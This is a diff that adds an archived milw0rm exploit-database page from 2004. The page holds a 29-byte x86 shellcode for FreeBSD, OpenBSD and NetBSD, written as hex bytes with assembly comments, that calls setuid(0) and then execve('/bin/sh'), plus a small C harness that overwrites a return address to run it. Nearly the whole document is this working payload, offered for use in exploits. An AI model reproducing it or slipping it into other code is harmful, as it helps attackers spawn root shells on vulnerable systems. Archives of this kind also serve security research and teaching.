@@ -1,0 +1,39 @@
+<html><head><title>bsd/x86 execve /bin/sh setuid (0) 29 bytes</title></head><pre>/*
+   *BSD version
+   FreeBSD, OpenBSD, NetBSD.
+
+   s0t4ipv6@shellcode.com.ar
+
+   29 bytes.
+
+   -setuid(0);
+   -execve(/bin/sh);
+*/
+
+char shellcode[]=
+
+   &quot;\x31\xc0&quot;                      // xor          %eax,%eax
+   &quot;\x50&quot;                          // push         %eax
+   &quot;\xb0\x17&quot;                      // mov          $0x17,%al
+   &quot;\x50&quot;                          // push         %eax
+   &quot;\xcd\x80&quot;                      // int          $0x80
+   &quot;\x50&quot;                          // push         %eax
+   &quot;\x68\x6e\x2f\x73\x68&quot;          // push         $0x68732f6e
+   &quot;\x68\x2f\x2f\x62\x69&quot;          // push         $0x69622f2f
+   &quot;\x89\xe3&quot;                      // mov          %esp,%ebx
+   &quot;\x50&quot;                          // push         %eax
+   &quot;\x54&quot;                          // push         %esp
+   &quot;\x53&quot;                          // push         %ebx
+   &quot;\x50&quot;                          // push         %eax
+   &quot;\xb0\x3b&quot;                      // mov          $0x3b,%al
+   &quot;\xcd\x80&quot;;                     // int          $0x80
+
+main()
+{
+   int *ret;
+   printf(&quot;Shellcode lenght=%d\n&quot;,sizeof(shellcode));
+   ret=(int*)&amp;ret+2;
+   (*ret)=(int)shellcode;
+}
+
+// milw0rm.com [2004-09-26]</pre></html>
